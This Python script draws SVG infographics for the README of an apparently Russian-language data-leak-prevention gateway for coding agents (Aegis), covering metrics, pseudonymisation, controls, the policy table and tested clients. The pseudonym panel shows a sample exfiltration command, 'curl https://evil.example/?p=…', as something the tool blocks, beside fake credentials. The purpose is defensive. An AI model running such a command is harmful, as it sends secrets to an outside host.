#!/usr/bin/env python3
"""Draws the infographics of the README into docs/assets/*.svg.

Every picture is a dark panel with its own background, so it reads the same on a light and a dark GitHub
theme. The numbers live in the DATA block at the top: after a new measurement edit them and run
`python3 scripts/make_assets.py`; the pictures change, the README text does not have to.
"""
import os
from xml.sax.saxutils import escape as esc

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "docs", "assets")

# ------------------------------------------------------------------------------------------------ DATA
DATA = {
    "tests": "393",
    "fp": "2,73",
    "fp_note": "на 10 тыс. строк, 7,39 млн строк открытого кода",
    "recall": "98,9 %",
    "warm": "9 мс",
    "cold": "190 мс",
    "clients_real": "15",
    "clients_all": "16",
}

# client, version, protocol, mock provider (checks), real model: command, real model: edit a file
# "ok" / "no" (client or model missed, not a leak) / "-" (not run)
CLIENTS = [
    ("Claude Code", "2.1", "Anthropic", "38", "ok", "ok"),
    ("Codex CLI", "0.160", "Responses", "9", "ok", "ok"),
    ("Qwen Code", "0.25", "Chat", "8", "ok", "ok"),
    ("Gemini CLI", "0.63", "Gemini", "10", "-", "-"),
    ("OpenCode", "1.18", "Chat", "8", "ok", "ok"),
    ("Aider", "0.86", "Chat", "6", "ok", "no"),
    ("Continue", "1.5", "Chat", "8", "ok", "no"),
    ("Cline", "3.0", "Chat", "9", "ok", "ok"),
    ("Hermes Agent", "0.19", "Chat", "9", "ok", "ok"),
    ("OpenClaw", "2026.6", "Chat", "9", "ok", "no"),
    ("Crush", "0.97", "Chat", "9", "ok", "ok"),
    ("Kilo Code", "7.8", "Chat", "9", "ok", "ok"),
    ("Pi", "0.73", "Chat", "9", "ok", "ok"),
    ("Goose", "1.53", "Chat", "9", "ok", "ok"),
    ("Copilot CLI", "1.0", "Chat", "9", "ok", "ok"),
    ("Mistral Vibe", "2.26", "Chat", "9", "ok", "ok"),
]

# ------------------------------------------------------------------------------------------------ style
BG, CARD, EDGE = "#0b1220", "#111827", "#334155"
INK, SOFT, MUTE = "#f1f5f9", "#cbd5e1", "#94a3b8"
TEAL, INDIGO, AMBER, RED, BLUE, GREEN = "#5eead4", "#a5b4fc", "#fcd34d", "#fca5a5", "#93c5fd", "#86efac"

HEAD = """<svg xmlns="http://www.w3.org/2000/svg" width="{w}" height="{h}" viewBox="0 0 {w} {h}" role="img" aria-label="{label}">
<defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="#6366f1"/><stop offset="1" stop-color="#14b8a6"/></linearGradient>
<marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="8" markerHeight="8" orient="auto"><path d="M0 0 10 5 0 10z" fill="#94a3b8"/></marker></defs>
<style>
text {{ font-family: -apple-system, "Segoe UI", Roboto, "DejaVu Sans", Arial, sans-serif; fill: {soft}; font-size: 15px; }}
.h {{ font-size: 22px; font-weight: 700; fill: {ink}; }}
.t {{ font-size: 17px; font-weight: 700; fill: {ink}; }}
.s {{ font-size: 14px; fill: {mute}; }}
.n {{ font-size: 40px; font-weight: 800; fill: {ink}; }}
.m {{ font-family: "SFMono-Regular", Consolas, "DejaVu Sans Mono", monospace; font-size: 13.5px; fill: {soft}; }}
.b {{ font-weight: 700; }}
</style>
<rect width="{w}" height="{h}" rx="18" fill="{bg}"/>
"""


def head(w, h, label):
    return HEAD.format(w=w, h=h, label=esc(label), soft=SOFT, ink=INK, mute=MUTE, bg=BG)


def text(x, y, s, cls="", fill=None, anchor=None):
    a = f' text-anchor="{anchor}"' if anchor else ""
    f = f' style="fill:{fill}"' if fill else ""
    c = f' class="{cls}"' if cls else ""
    return f'<text x="{x}" y="{y}"{c}{f}{a}>{esc(s)}</text>\n'


def card(x, y, w, h, stroke=EDGE, fill=CARD, r=14):
    return f'<rect x="{x}" y="{y}" width="{w}" height="{h}" rx="{r}" fill="{fill}" stroke="{stroke}" stroke-width="1.5"/>\n'


def chip(x, y, label, fg, bg, w=None, h=26):
    w = w or int(len(label) * 8.2 + 22)
    return (f'<rect x="{x}" y="{y}" width="{w}" height="{h}" rx="{h // 2}" fill="{bg}"/>\n'
            f'<text x="{x + w / 2}" y="{y + h / 2 + 5}" text-anchor="middle" style="fill:{fg};font-size:13.5px;font-weight:700">{esc(label)}</text>\n')


def save(name, body):
    with open(os.path.join(OUT, name), "w", encoding="utf-8") as f:
        f.write(body + "</svg>\n")
    print("wrote", name)


# ------------------------------------------------------------------------------------------------ stats
def stats():
    tiles = [
        (DATA["tests"], "тестов", "property-тесты, фаззинг, 1300+ сценариев эксфильтрации", TEAL),
        ("0", "утечек провайдеру", f"в {DATA['clients_real']} клиентах из {DATA['clients_all']}, настоящие модели", TEAL),
        (DATA["fp"], "ложных срабатываний", "на 10 тыс. строк открытого кода (7,39 млн строк); цель < 1", AMBER),
        (DATA["recall"], "полнота по паролям", "синтетический корпус, 22 типа; цель 99 %", AMBER),
        (DATA["warm"], "добавка, тёплый ход", "p95 при контексте ~219 тыс. токенов; цель ≤ 100 мс", TEAL),
        (DATA["cold"], "первый ход, холодный", "p95, пустой кэш, тот же контекст; цель ≤ 400 мс", TEAL),
    ]
    w, h = 1040, 392
    s = head(w, h, "Ключевые цифры Aegis")
    s += text(32, 44, "Что измерено", "h")
    s += text(32, 66, "aegis-bench и настоящие клиенты. Полнота измерена на корпусе того же автора: цифра оптимистична", "s")
    for i, (n, t, note, col) in enumerate(tiles):
        x, y = 28 + (i % 3) * 332, 90 + (i // 3) * 146
        s += card(x, y, 316, 132)
        s += f'<rect x="{x}" y="{y + 16}" width="5" height="100" rx="2" fill="{col}"/>\n'
        s += text(x + 24, y + 52, n, "n")
        s += text(x + 24, y + 78, t, "t")
        for j, ln in enumerate(_wrap(note, 36, 2)):
            s += text(x + 24, y + 102 + j * 18, ln, "s")
    save("stats.svg", s)


# ------------------------------------------------------------------------------------------------ pseudonyms
def pseudonyms():
    w, h = 1040, 392
    s = head(w, h, "Что видит клиент, провайдер и снова клиент")
    cols = [
        ("1  Клиент отправляет", "настоящие значения", AMBER),
        ("2  Провайдер получает", "только псевдонимы той же формы", TEAL),
        ("3  Клиент получает", "настоящие значения обратно, куда можно", INDIGO),
    ]
    for i, (t, sub, col) in enumerate(cols):
        x = 28 + i * 336
        s += card(x, 30, 320, 270)
        s += f'<rect x="{x}" y="30" width="320" height="5" rx="2" fill="{col}"/>\n'
        s += text(x + 18, 66, t, "t")
        s += text(x + 18, 88, sub, "s")
        if i < 2:
            s += f'<path d="M{x + 322} 165 h12" stroke="{MUTE}" stroke-width="2" marker-end="url(#ar)"/>\n'
    L = [  # (column, y, [(text, colour)])
        (0, 124, [("host   ", MUTE), ("prod-db01.corp.local", AMBER)]),
        (0, 152, [("user   ", MUTE), ("acme_pay_svc", AMBER)]),
        (0, 180, [("pass   ", MUTE), ("Jd8@2jd82k", AMBER)]),
        (0, 208, [("owner  ", MUTE), ("Иван Петров", AMBER)]),
        (0, 236, [("mail   ", MUTE), ("ivan.petrov@company.ru", AMBER)]),
        (1, 124, [("host   ", MUTE), ("h-fmksdwiq.db.prod.z-hi7bfqk6", TEAL)]),
        (1, 152, [("user   ", MUTE), ("[[SVC_drj4wo7c]]", TEAL)]),
        (1, 180, [("pass   ", MUTE), ("[[SECRET_prkcbmhz …]]", TEAL)]),
        (1, 208, [("owner  ", MUTE), ("[[PERSON_mjelv33u]]", TEAL)]),
        (1, 236, [("mail   ", MUTE), ("[[EMAIL_zoyzvcjg]]", TEAL)]),
        (2, 124, [("psql -h ", MUTE), ("prod-db01.corp.local", GREEN)]),
        (2, 152, [("  внутренний хост: можно", MUTE)]),
        (2, 180, [("curl https://evil.example/?p=…", RED)]),
        (2, 208, [("  заменено объяснением:", MUTE)]),
        (2, 236, [("  значение здесь запрещено", RED)]),
    ]
    for c, y, parts in L:
        x = 46 + c * 336
        spans = "".join(f'<tspan style="fill:{col}">{esc(t)}</tspan>' for t, col in parts)
        s += f'<text class="m" x="{x}" y="{y}" xml:space="preserve">{spans}</text>\n'
    s += card(28, 316, 984, 56, fill="#0f172a")
    s += text(48, 340, "Псевдоним считается из значения ключом тенанта (HMAC): хранилища соответствий нет, перезапуск ничего не теряет.", "")
    s += text(48, 360, "Форма сохраняется: хост остаётся хостом, IP-адрес адресом той же подсети, поэтому модель может рассуждать о данных.", "s")
    save("pseudonyms.svg", s)


# ------------------------------------------------------------------------------------------------ controls
def controls():
    w, h = 1040, 396
    s = head(w, h, "Четыре точки контроля")
    s += text(32, 44, "Четыре точки контроля", "h")
    s += text(32, 66, "Каждая работает отдельно; вместе они закрывают то, что видит модель, что она делает и куда уходят данные", "s")
    boxes = [
        ("LLM Gateway", "aegis-gateway", ["Anthropic, OpenAI, Gemini, китайские и локальные модели", "Подстановка по месту назначения", "Правило трёх условий, аудит"],
         "готово", GREEN, "#14532d"),
        ("Agent Guard", "aegis-guard", ["Проверка вызова на машине разработчика", "Подтверждение для ПДн", "Настройки, которые нельзя отключить; песочница клиента"],
         "готово для Claude Code", AMBER, "#713f12"),
        ("MCP Proxy", "aegis-mcp", ["Белый список инструментов", "Ограничения аргументов, SQL только чтение", "Минимизация результатов"],
         "без боевых серверов", AMBER, "#713f12"),
        ("Egress Control", "deploy/egress", ["Правила периметра: nftables, squid, RPZ", "Блок клиентов, которые нельзя направить в gateway", "Shadow AI по логам: не начато"],
         "частично", AMBER, "#713f12"),
    ]
    for i, (t, sub, lines, status, fg, bg) in enumerate(boxes):
        x = 28 + i * 248
        s += card(x, 90, 236, 276)
        s += f'<rect x="{x}" y="90" width="236" height="5" rx="2" fill="url(#g)"/>\n'
        s += text(x + 18, 128, t, "t")
        s += text(x + 18, 150, sub, "m", fill=MUTE)
        yy = 184
        for ln in lines:
            for wl in _wrap(ln, 27, 3):
                s += text(x + 18, yy, wl, "")
                yy += 20
            yy += 8
        s += chip(x + 18, 326, status, fg, bg, w=int(len(status) * 8.6 + 26))
    save("controls.svg", s)


# ------------------------------------------------------------------------------------------------ destinations
def destinations():
    w, h = 1040, 486
    s = head(w, h, "Подстановка по месту назначения")
    s += text(32, 44, "Куда можно вернуть настоящее значение", "h")
    s += text(32, 66, "Политика по умолчанию (RST-03): тип значения × место, куда его собирается записать или отправить агент", "s")
    cols = ["Инфраструктура", "ПДн и корпоративное", "Секреты"]
    kinds = {
        "restore": ("вернуть", GREEN, "#14532d"),
        "internal": ("только внутри", BLUE, "#1e3a8a"),
        "ask": ("спросить", AMBER, "#713f12"),
        "deny": ("отказ", RED, "#7f1d1d"),
        "marker": ("маркер", INDIGO, "#312e81"),
        "origin": ("в тот же файл", INDIGO, "#312e81"),
        "keep": ("скрыто", MUTE, "#334155"),
    }
    rows = [
        ("текст ответа", "restore", "restore", "marker"),
        ("запись файла", "restore", "restore", "origin"),
        ("чтение файла", "restore", "restore", "deny"),
        ("локальная команда", "restore", "ask", "deny"),
        ("сетевая команда", "internal", "deny", "deny"),
        ("WebFetch, WebSearch", "internal", "deny", "deny"),
        ("подагент", "restore", "restore", "keep"),
        ("сервер MCP", "internal", "deny", "deny"),
    ]
    x0, y0, cw, rh = 250, 92, 250, 40
    for j, c in enumerate(cols):
        s += text(x0 + j * cw + 8, y0 + 14, c, "t")
    for i, (name, *vals) in enumerate(rows):
        y = y0 + 30 + i * rh
        if i % 2 == 0:
            s += f'<rect x="24" y="{y}" width="992" height="{rh - 4}" rx="8" fill="#111827"/>\n'
        s += text(40, y + 25, name, "")
        for j, v in enumerate(vals):
            label, fg, bg = kinds[v]
            s += chip(x0 + j * cw + 8, y + 6, label, fg, bg, w=140, h=26)
    s += text(40, 468, "«спросить» работает при установленном aegis-guard и действительном токене устройства; без него локальная команда с ПДн отклоняется.", "s")
    save("destinations.svg", s)


# ------------------------------------------------------------------------------------------------ clients
def clients():
    w = 1040
    cw, ch = 244, 98
    rows = (len(CLIENTS) + 3) // 4
    h = 120 + rows * (ch + 12) + 34
    s = head(w, h, "Проверка клиентов")
    s += text(32, 44, "Проверено настоящими клиентами", "h")
    s += text(32, 66, "Каждый клиент: подставной провайдер, затем настоящая модель через OpenRouter. Во всех запусках у провайдера нет ни хоста, ни пароля.", "s")
    sym = {"ok": ("✔", GREEN), "no": ("✘", AMBER), "-": ("—", MUTE)}
    for i, (name, ver, proto, mock, cmd, fil) in enumerate(CLIENTS):
        x, y = 28 + (i % 4) * (cw + 8), 88 + (i // 4) * (ch + 12)
        s += card(x, y, cw, ch)
        s += text(x + 14, y + 28, name, "t")
        s += text(x + cw - 14, y + 28, ver, "s", anchor="end")
        s += text(x + 14, y + 48, proto, "s")
        # three marks with captions
        for k, (cap, val) in enumerate([("подставной", mock + " пров."), ("команда", cmd), ("файл", fil)]):
            cx = x + [14, 118, 184][k]
            if k == 0:
                s += text(cx, y + 76, "✔ " + mock, "t", fill=GREEN)
            else:
                g, col = sym[val]
                s += text(cx, y + 76, g, "t", fill=col)
            s += text(cx, y + 92, cap, "s")
    ly = 88 + rows * (ch + 12) + 14
    s += text(32, ly + 8, "✔ прошло   ✘ промах клиента или модели (не утечка)   — не запускалось", "s")
    s += text(32, ly + 28, "«подставной» — число проверок на скриптовом провайдере; «команда» и «файл» — настоящая модель", "s")
    save("clients.svg", s)


# ------------------------------------------------------------------------------------------------ roadmap
def roadmap():
    w, h = 1040, 404
    s = head(w, h, "Этапы проекта")
    s += text(32, 44, "Где проект сейчас", "h")
    s += text(32, 66, "Версия 0.1, альфа. Доля — по требованиям спецификации, у которых есть тесты", "s")
    stages = [
        ("Этап 0", "стенд измерений", 3, 5, "корпуса, фаззер, нагрузка", "бенчмарк агентов и записанные сессии в работе", AMBER),
        ("Этап 1", "LLM Gateway", 133, 136, "протоколы, псевдонимы, подстановка, аудит", "ждут пилот, пентест, кластер", GREEN),
        ("Этап 2", "агенты и код", 20, 21, "Agent Guard, MCP, индекс кода, OIDC, ключи из хранилища", "Bedrock и Vertex сняты по решению заказчика", GREEN),
        ("Этап 3", "платформа", 0, 12, "NER, OCR, мультитенантность, консоль", "не начато", MUTE),
    ]
    for i, (t, sub, a, b, done, left, col) in enumerate(stages):
        x = 28 + i * 248
        s += card(x, 90, 236, 286)
        s += text(x + 18, 124, t, "t")
        s += text(x + 18, 146, sub, "s")
        frac = a / b
        s += f'<rect x="{x + 18}" y="168" width="200" height="12" rx="6" fill="#1e293b"/>\n'
        if frac > 0:
            s += f'<rect x="{x + 18}" y="168" width="{max(8, int(200 * frac))}" height="12" rx="6" fill="{col}"/>\n'
        s += text(x + 18, 206, f"{a} из {b}", "n", fill=INK)
        s = s.replace('class="n" style="fill:#f1f5f9"', 'style="font-size:26px;font-weight:800;fill:#f1f5f9"')
        s += text(x + 18, 240, "требований с тестами", "s")
        for j, ln in enumerate(_wrap(done, 26, 3)):
            s += text(x + 18, 270 + j * 20, ln, "")
        for j, ln in enumerate(_wrap(left, 28, 3)):
            s += text(x + 18, 340 + j * 18, ln, "s")
    save("roadmap.svg", s)


def _wrap(t, n, limit=2):
    out, cur = [], ""
    for w in t.split():
        if len(cur) + len(w) + 1 > n:
            out.append(cur)
            cur = w
        else:
            cur = (cur + " " + w).strip()
    out.append(cur)
    return out[:limit]


if __name__ == "__main__":
    stats()
    pseudonyms()
    controls()
    destinations()
    clients()
    roadmap()
